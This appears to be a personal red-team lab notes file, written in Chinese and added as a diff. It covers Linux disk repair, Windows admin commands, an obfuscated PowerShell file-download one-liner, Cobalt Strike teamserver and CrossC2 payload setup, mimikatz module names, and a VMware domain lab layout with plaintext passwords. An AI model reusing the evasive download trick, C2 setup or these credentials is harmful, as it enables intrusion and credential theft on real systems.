@@ -1,0 +1,154 @@
+#########################################################################################
+
+linux 只读文件系统修复:
+
+#查找文件系统的只读分区
+mount
+#/dev/nvme0n1p2 on / type ext4 (ro,relatime,errors=remount-ro)
+
+#取消挂载的系统分区
+umount /dev/nvme0n1p2
+
+#修复磁盘
+fsck.ext4 -y /dev/nvme0n1p2
+
+#重启
+reboot
+
+###########################################################################################
+
+windows CMD关机:
+shutdown /s /f /t 0
+
+设置需要密码登录:
+运行输入 netplwiz
+
+windows server设置无快捷键登录:
+运行 secpol.msc
+本地策略里面设置
+
+frp服务器后台运行:
+nohup ./frps -c ./frps.ini &
+
+
+powershell下载文件:
+cmd.exe /C powershell.exe (new-object System.Net.WebClient).DownloadFile(('htt;p://media-cache-ec0/*.txt' -replace ';',''),'image11.png')
+###
+(new-object System.Net.WebClient).DownloadFile(('htt;p://media-cache-ec0/*.txt' -replace ';',''),'image11.png')
+
+ubuntu server 22.04:
+192.168.1.44
+momoda
+momoda
+#运行 cobaltstrike 服务器端
+sudo bash teamserver 192.168.1.44 momoda
+
+解决meterpreter中shell 中文乱码:
+在shell 终端中输入  chcp 65001
+
+ubuntu16.04:
+momoda
+ZCxq&95271&
+
+cobaltstrike生成 linux payload:
+./genCrossC2.Linux 监听的IP 监听的端口 null null Linux x64 test
+#kali 192.168.1.15
+
+
+####################################### 域环境搭建 ################################################
+vmware域环境:
+# vmnet0  桥接模式   192.168.1.0
+# vmnet8  NAT模式    172.44.22.0
+# vmnet14 仅主机模式  10.30.30.0
+
+# 第一层网络
+ubuntu20.04:
+net1： 192.168.147
+net2： 172.44.22.128
+root: anegl123
+momoda/momoda
+
+# 第二层网络
+windows 7 pro:   #
+net1： 172.44.22.129
+net2： 10.30.30.129
+win7nat/zcxq123456
+#192.168.1.48
+
+# 第三层网络
+windows 7 ent:
+WIN7-USER
+net1： 10.30.30.130
+win7host/angel95271
+telnet用户名密码 win7host-telnet/ZCxq&95271&
+###########
+windows server 2008 r2:
+WIN2008-USER
+net1： 10.30.30.131
+win2008host/momoda1234
+###########
+windows server 2012 r2:
+net1： 10.30.30.128
+WIN2012-AD
+DNS服务器：10.30.30.128
+网关：10.30.30.1
+win2012host/ZCxq&95271&
+工作组：XIAOBENDAN
+域名：moomda.com
+目录服务还原密码：ZCxq&123456&
+域控： administrator/ZCxq&95271&123
+########################################################################################
+
+standard：  标准模块，基本命令
+crypto：    加密相关模块
+sekurlsa：  与证书相关的模块
+kerberos：  kerberos模块
+privilege： 提权相关模块
+process：   进程相关模块
+serivce：   服务相关模块
+lsadump：   LsaDump模块
+ts：        终端服务器模块
+event：     事件模块
+misc：      杂项模块
+token：     令牌操作模块
+vault：     Windows 、证书模块
+minesweeper：Mine Sweeper模块
+net：
+dpapi：     DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]
+busylight： BusyLight Module
+sysenv：    系统环境值模块
+sid：       安全标识符模块
+iis：       IIS XML配置模块
+rpc：       mimikatz的RPC控制
+sr98：      用于SR98设备和T5577目标的RF模块
+rdm：       RDM（830AL）器件的射频模块
+acr：       ACR模块
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
